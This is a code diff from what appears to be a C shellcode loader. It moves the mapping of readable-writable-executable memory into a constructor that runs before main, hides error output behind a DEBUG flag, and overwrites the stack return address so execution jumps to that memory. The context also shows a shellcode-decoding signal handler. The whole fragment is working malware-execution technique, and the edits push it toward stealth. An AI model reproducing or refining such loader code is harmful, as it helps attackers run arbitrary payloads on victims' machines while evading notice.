@@ -71,19 +71,21 @@ void decode_shellcode_bytes(int signum) {
     siglongjmp(g_jump_buffer, 1);
 }
 
-int main(int argc, char* argv[]) {
-    // Calculate the size of the shellcode
-    long code_size = sizeof(SHELLCODE) / sizeof(SHELLCODE[0]);
-
+[[gnu::constructor]]
+void alloc_exec_mem() {
     // Allocate executable memory
     g_executable_memory = mmap(
-        NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
+        NULL, CODE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
     );
     if (g_executable_memory == MAP_FAILED) {
+#ifdef DEBUG
         perror("Failed to allocate memory");
-        return EXIT_FAILURE;
+#endif
+        exit(EXIT_FAILURE);
     }
+}
 
+int main(int argc, char* argv[]) {
     // Overwrite the return address on the stack
     __asm__("movq %0, +8(%%rsp)" : : "r"(g_executable_memory));
 
